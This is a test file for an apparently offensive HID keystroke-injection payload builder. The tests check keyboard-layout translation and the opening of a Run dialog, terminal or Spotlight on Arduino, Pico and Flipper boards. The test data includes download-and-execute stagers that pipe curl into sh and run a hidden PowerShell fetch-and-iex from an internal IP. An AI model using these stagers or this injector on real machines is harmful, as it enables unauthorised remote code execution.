"""F2 — the target keyboard layout and the universal opener.

A keystroke injector sends HID usage codes and the target OS translates them
with ITS layout; every table these boards ship is US. These tests pin the
Italian pre-translation (``/`` -> ``&``, ``{`` behind AltGr), the fact that
AltGr-only characters become EXPLICIT key events on the boards that can press
modifiers, that a DuckyScript STRING says it cannot instead of typing junk, and
that the opener is chosen per target family rather than assumed to be Windows.
"""
import os

import pytest

from phantom.utils import hid_layouts
from phantom.utils.hid_builder import board_notes, build_hid_payload
from phantom.utils.hid_layouts import (
    HID_LAYOUTS,
    normalize_layout,
    segments,
    special_key_chars,
    translate_text,
    unsupported_chars,
)


class TestTheLayoutTable:
    def test_the_layouts_are_named(self):
        # us = the boards' own table; it/de = pre-translated targets
        assert HID_LAYOUTS == ("us", "it", "de")

    def test_normalize_accepts_the_aliases(self):
        assert normalize_layout("IT-IT") == "it"
        assert normalize_layout("") == "us"
        assert normalize_layout("US") == "us"

    def test_an_unknown_layout_is_refused(self):
        with pytest.raises(ValueError) as excinfo:
            normalize_layout("fr")
        assert "fr" in str(excinfo.value)

    def test_the_us_layout_leaves_the_command_alone(self):
        cmd = "curl -sk http://h/x | sh; echo (1) {2} \"3\""
        assert translate_text(cmd, "us") == cmd

    @pytest.mark.parametrize("typed,expected", [
        ("=", ")"),
        ("+", "]"),
        ("(", "*"),
        (")", "("),
        ("/", "&"),
        ("&", "^"),
        (":", ">"),
        (";", "<"),
        ("?", "_"),
        ('"', "@"),
        ("*", "}"),
        ("^", "+"),
        # the two keys US and IT SWAP: on IT '?'/' live right of '0' (US
        # '-'/'_') and '-'/'_' left of right-Shift (US '/'/'?'). Getting these
        # wrong types `powershell 'w h 'c` and a broken URL quote, so they are
        # pinned here with the actual Windows IT-layout scan codes.
        ("-", "/"),
        ("_", "?"),
        ("'", "-"),
        ("\\", "`"),
        ("|", "~"),
    ])
    def test_the_italian_keys_that_move_are_translated(self, typed, expected):
        assert translate_text(typed, "it") == expected

    def test_characters_that_share_a_key_are_untouched(self):
        # on both layouts these sit on the same physical key
        assert translate_text("aZ09 , . ! $ %", "it") == "aZ09 , . ! $ %"

    def test_the_translation_is_per_character_not_a_cascade(self):
        # '?' -> '_', and that '_' must NOT then be re-read as '?'
        assert translate_text("?", "it") == "_"
        assert translate_text("_?", "it") == "?_"

    def test_the_altgr_and_non_us_characters_are_reported(self):
        assert special_key_chars("a{b}@#<>c", "it") == \
            ("#", "<", ">", "@", "{", "}")
        assert special_key_chars("whoami", "it") == ()
        assert special_key_chars("{", "us") == ()

    def test_a_character_with_no_key_is_reported(self):
        assert unsupported_chars("echo `x~", "it") == ("`", "~")
        assert unsupported_chars("`", "us") == ()


class TestSegments:
    def test_the_us_layout_is_one_printable_run(self):
        assert [(s.kind, s.text) for s in segments("whoami", "us")] == \
            [("print", "whoami")]

    def test_an_altgr_character_breaks_the_run(self):
        parts = segments("a{b", "it")
        assert [p.kind for p in parts] == ["print", "key", "print"]
        assert parts[0].text == "a" and parts[2].text == "b"
        key = parts[1]
        assert (key.usage, key.shift, key.altgr) == (0x2F, True, True)

    def test_a_non_us_key_is_an_explicit_event(self):
        (key,) = segments("<", "it")
        assert (key.kind, key.usage, key.shift, key.altgr) == \
            ("key", 0x64, False, False)

    def test_the_printable_runs_are_translated(self):
        parts = segments("a/b(c)", "it")
        assert parts == (hid_layouts.Segment("print", text="a&b*c("),)


class TestArduinoLayout:
    def test_altgr_becomes_an_explicit_key_event(self):
        body = build_hid_payload("arduino", "a{b", layout="it").content
        assert 'Keyboard.print(F("a"));' in body
        assert "KEY_RIGHT_ALT" in body
        assert "Keyboard.press(KEY_LEFT_SHIFT);" in body
        assert "Keyboard.press(136 + 0x2F);" in body
        assert 'Keyboard.print(F("b"));' in body

    def test_the_non_us_key_uses_its_raw_usage(self):
        body = build_hid_payload("arduino", "a<b", layout="it").content
        assert "Keyboard.press(136 + 0x64);" in body

    def test_a_shift_only_character_is_rewritten_not_typed_as_a_key(self):
        # '(' is plain Shift+8 on IT: it stays inside the printed string
        body = build_hid_payload("arduino", "echo (x)", layout="it").content
        assert 'Keyboard.print(F("echo *x("));' in body
        assert "KEY_RIGHT_ALT" not in body

    def test_the_default_layout_is_us(self):
        body = build_hid_payload("arduino", "a{b").content
        assert 'Keyboard.print(F("a{b"));' in body
        assert "KEY_RIGHT_ALT" not in body
        assert build_hid_payload("arduino", "x").layout == "us"


class TestPicoLayout:
    def test_altgr_becomes_an_explicit_key_event(self):
        body = build_hid_payload("pico", "a{b", layout="it").content
        assert "layout.write('a')" in body
        assert "kbd.press(Keycode.RIGHT_ALT, Keycode.LEFT_SHIFT, 0x2F)" in body
        assert "layout.write('b')" in body

    def test_the_default_layout_is_us(self):
        body = build_hid_payload("pico", "a{b").content
        assert "layout.write('a{b')" in body


class TestDuckyLayout:
    def test_the_string_is_translated(self):
        body = build_hid_payload("flipper", "curl http://h/a",
                                 layout="it").content
        assert "STRING curl http>&&h&a" in body

    def test_it_says_when_duckyscript_cannot_type_a_character(self):
        notes = build_hid_payload("flipper", "a{b", layout="it").notes
        assert any("DuckyScript STRING cannot type" in n for n in notes), notes

    def test_an_arduino_board_does_not_get_that_warning(self):
        # it types them as explicit key events, so there is nothing to warn about
        notes = build_hid_payload("arduino", "a{b", layout="it").notes
        assert not any("cannot type" in n for n in notes), notes
        assert any("explicit AltGr" in n for n in notes), notes

    def test_an_unknown_layout_is_refused_by_the_builder(self):
        with pytest.raises(ValueError):
            build_hid_payload("pico", "whoami", layout="fr")


class TestUniversalOpener:
    def test_windows_opens_the_run_dialog(self):
        payload = build_hid_payload("flipper", "whoami", target="windows",
                                    open_run=True)
        assert "HOLD GUI R" in payload.content
        assert any("Win+R" in n for n in payload.notes), payload.notes

    def test_linux_opens_a_terminal(self):
        payload = build_hid_payload("flipper", "whoami", target="linux",
                                    open_run=True)
        assert "HOLD CTRL ALT T" in payload.content

    def test_macos_opens_spotlight_and_types_terminal(self):
        body = build_hid_payload("pico", "whoami", target="macos",
                                 open_run=True).content
        assert "kbd.press(Keycode.GUI, Keycode.SPACEBAR)" in body
        assert "layout.write('terminal')" in body
        assert "Keycode.ENTER" in body

    def test_the_arduino_opener_uses_the_target_chord(self):
        body = build_hid_payload("arduino", "whoami", target="linux",
                                 open_run=True).content
        assert "Keyboard.press(KEY_LEFT_CTRL);" in body
        assert "Keyboard.press('t');" in body
        assert "KEY_LEFT_GUI" not in body

    def test_no_target_falls_back_to_windows_and_says_so(self):
        payload = build_hid_payload("flipper", "whoami", open_run=True)
        assert "HOLD GUI R" in payload.content
        assert any("assuming a Windows run dialog" in n for n in payload.notes)


class TestSketchFolder:
    def test_the_notes_name_a_folder_matching_the_file(self):
        notes = board_notes("arduino")
        assert any("arduino_phantom_hid/arduino_phantom_hid.ino" in n
                   for n in notes), notes

    def test_the_default_arduino_output_lives_in_that_folder(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        with mock.patch("phantom.utils.paths.data_dir",
                        return_value=str(tmp_path)), \
                mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid("arduino --stager linux --target linux")
        out = os.path.join(str(tmp_path), "vectors", "arduino_phantom_hid",
                           "arduino_phantom_hid.ino")
        assert os.path.isfile(out)
        with open(out, encoding="utf-8") as handle:
            assert "#include <Keyboard.h>" in handle.read()

    def test_the_other_boards_stay_plain_files(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        with mock.patch("phantom.utils.paths.data_dir",
                        return_value=str(tmp_path)), \
                mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid("pico 'whoami' --target linux")
        assert os.path.isfile(os.path.join(str(tmp_path), "vectors",
                                           "pico_main.py"))


class TestTheLayoutHasNoSilentDefault:
    """``us`` used to be the default, and the field paid for it.

    Measured 2026-11-01 on an Italian target: the ``:`` of the URL is
    Shift+``;`` in the US table, and that key is ``ò``/``ç`` on an Italian
    keyboard — the Run dialog showed ``192.168.1.155ç9443`` while the sketch
    looked perfect. A board cannot read the target's layout, so the bench's
    locale is the only signal; using it SILENTLY would just be a different
    unstated assumption, so the artefact says which layout it used.
    """

    @pytest.mark.parametrize("name,expected", [
        ("it-IT", "it"),
        ("it_IT.UTF-8", "it"),
        ("Italian_Italy", "it"),
        ("italian", "it"),
        ("en-US", "us"),
        ("C", "us"),
        ("", "us"),
    ])
    def test_the_locale_names_the_layout(self, name, expected):
        assert hid_layouts.detected_layout(name) == expected

    def test_the_cli_takes_the_layout_from_this_machine(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        out = os.path.join(str(tmp_path), "it.ino")
        with mock.patch("phantom.utils.hid_layouts.detected_layout",
                        return_value="it"), \
                mock.patch("phantom.modules.payload.notifier") as note:
            PayloadModule().do_hid(
                f"arduino 'curl -sk http://10.0.0.5:8443/x | sh' --out {out}")
        with open(out, encoding="utf-8") as handle:
            body = handle.read()
        assert "target keyboard layout: it" in body
        # and it SAYS where the choice came from, instead of assuming
        assert any("locale" in str(c) for c in note.info.call_args_list)

    def test_asking_for_us_on_an_italian_bench_warns(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        out = os.path.join(str(tmp_path), "us.ino")
        with mock.patch("phantom.utils.hid_layouts.detected_layout",
                        return_value="it"), \
                mock.patch("phantom.modules.payload.notifier") as note:
            PayloadModule().do_hid(f"arduino 'whoami' --layout us --out {out}")
        warnings = " ".join(str(c) for c in note.warn.call_args_list)
        assert "\u00e7" in warnings, warnings


class TestTheTargetReadsTheCommandBack:
    """The inverse direction, which is the one that actually failed.

    Every table above checks what the board SENDS. The defect lives in what the
    host MAKES of it: the artefact is only correct if an Italian keyboard, fed
    the US scan codes in the sketch, produces the command again — character for
    character. This reconstructs the emitted stream (print runs plus the
    explicit AltGr/non-US key events), maps it back through the IT layout and
    compares it with the command. With ``layout="us"`` this is exactly where
    ``:`` would come back as ``ç``.
    """

    CMD = ("powershell -w h -c \"$s=(curl.exe -skf "
           "'https://192.168.1.155:9443/s/windows?auth=OtRiek-gfEE' "
           "| Out-String);if(!$s.Trim()){throw 'empty'};iex $s\"")

    # An explicit AltGr key event, and the character an IT host makes of it.
    _KEY_EVENT = {
        (0x2F, False, True): "[", (0x2F, True, True): "{",
        (0x30, False, True): "]", (0x30, True, True): "}",
        (0x33, False, True): "@", (0x34, False, True): "#",
    }

    # The one measured divergence that broke the live test, read FORWARD: the
    # US `:` is Shift+`;` (0x33 shifted), and on an Italian keyboard 0x33 is
    # ``ò`` whose shifted form is ``ç``.
    _US_TO_IT = {":": "\u00e7"}

    @classmethod
    def _emitted(cls, body):
        """The characters the sketch sends, in order, as US table codes.

        A print run comes back as ``str``; an explicit ``press(0x..)`` comes
        back as ``(usage, shift, altgr)``, read from the modifier lines that
        ``_arduino_typing`` emits immediately before it.
        """
        lines = [ln.strip() for ln in body.splitlines()]
        out = []
        for index, line in enumerate(lines):
            if 'Keyboard.print(F("' in line:
                raw = line.split('Keyboard.print(F("', 1)[1]
                raw = raw.rsplit('"));', 1)[0]
                out.append(raw.replace("\\\\", "\\").replace('\\"', '"'))
            elif line.startswith("Keyboard.press(136 + 0x"):
                # 136 + usage is the raw-keycode form: `press(0x2F)` is ASCII
                # '/', which Keyboard.h maps to usage 0x38, not the `[` key.
                usage = int(line.split("Keyboard.press(136 + 0x", 1)[1]
                             .split(")", 1)[0], 16)
                before = lines[max(0, index - 4):index]
                shift = any("KEY_LEFT_SHIFT" in b for b in before)
                altgr = any("KEY_RIGHT_ALT" in b for b in before)
                out.append((usage, shift, altgr))
        return out

    def test_the_italian_host_gets_the_command_back(self):
        body = build_hid_payload("arduino", self.CMD, layout="it").content
        # the inverse of the substitution table IS the forward reading: it says
        # "the physical key that US types as Y types X here"
        inverse = {v: k for k, v in hid_layouts._IT_SUBSTITUTIONS.items()}
        read_back = []
        for piece in self._emitted(body):
            if isinstance(piece, tuple):
                read_back.append(self._KEY_EVENT[piece])
            else:
                read_back.append("".join(inverse.get(c, c) for c in piece))
        assert "".join(read_back) == self.CMD

    def test_the_old_us_default_is_measurably_wrong_for_it(self):
        # the control, and the reason this class exists: with the silent `us`
        # default the board sends the command correctly and the HOST reads
        # something else on an Italian layout
        body = build_hid_payload("arduino", self.CMD, layout="us").content
        sent = "".join(p for p in self._emitted(body) if isinstance(p, str))
        assert sent == self.CMD         # the US table sends what it means
        italian = "".join(self._US_TO_IT.get(c, c) for c in sent)
        assert italian != self.CMD, "the defect this class covers came back"
        assert "\u00e7" in italian
        assert "192.168.1.155:9443" not in italian


class TestGermanLayout:
    """``de`` is the second non-US layout: QWERTZ plus AltGr punctuation.

    Same contract as ``it``: the table is per-layout DATA, the printer is
    sent a RAW usage (136 + usage) and not an ASCII code that Keyboard.h
    would remap, and German letters that sit on a US key are PRINTED rather
    than turned into a key event or a warning.
    """

    CMD = 'curl -sk "h://a"'

    def test_y_and_z_are_swapped(self):
        assert hid_layouts.translate_text("yz", "de") == "zy"

    def test_altgr_punctuation_is_an_explicit_key_event(self):
        body = build_hid_payload("arduino", "a{b", layout="de").content
        assert "Keyboard.press(136 + 0x24);" in body   # AltGr+7 is '{'
        assert 'Keyboard.print(F("a"));' in body

    def test_the_german_host_reads_the_command_back(self):
        body = build_hid_payload("arduino", self.CMD, layout="de").content
        # `"` -> `@` (Shift+2), `:` -> `>` (Shift+.), `/` -> `&` (Shift+7),
        # `-` -> `/` (the key US has as slash)
        assert 'Keyboard.print(F("curl /sk @h>&&a@"));' in body

    def test_german_letters_are_typed_not_warned_about(self):
        payload = build_hid_payload("arduino", "gr\u00fc\u00dfe", layout="de")
        assert not any("no key produces" in n for n in payload.notes), payload.notes
        assert 'Keyboard.print(F("gr[-e"));' in payload.content

    def test_the_aliases_are_accepted(self):
        assert hid_layouts.normalize_layout("german") == "de"
        assert hid_layouts.normalize_layout("DE_de") == "de"
